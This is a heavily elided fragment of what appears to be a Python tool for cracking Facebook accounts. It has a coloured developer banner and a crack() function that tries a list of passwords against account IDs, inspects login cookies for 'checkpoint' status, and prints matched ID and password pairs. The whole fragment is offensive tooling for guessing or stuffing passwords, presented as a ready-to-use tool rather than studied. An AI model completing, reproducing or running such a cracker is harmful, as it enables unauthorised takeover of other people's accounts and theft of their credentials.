...
\x1b[38;5;46m______________________________________________________
 ...
 \033[1;31m[\033[1;32m⊡\033[1;31m]\033[1;32m DEVELOPER : 🔥 TANJID AHMED 🔥
 \033[1;31m[\033[1;32m⊡\033[1;31m]\033[1;32m FACEBOOK  :   TANJID AHMED
 \033[1;31m[\033[1;32m⊡\033[1;31m]\033[1;32m GITHUB    :   TOXICARCHOWDHURY
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{bo} [Tanjid] {h}{loop}|{len(id)} | {h}{ok} ")
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				#print ()
				print(f'\r\r\x1b[38;5;46m[Tanjid-OK💉] '+idf+ ' | '+pw+'')
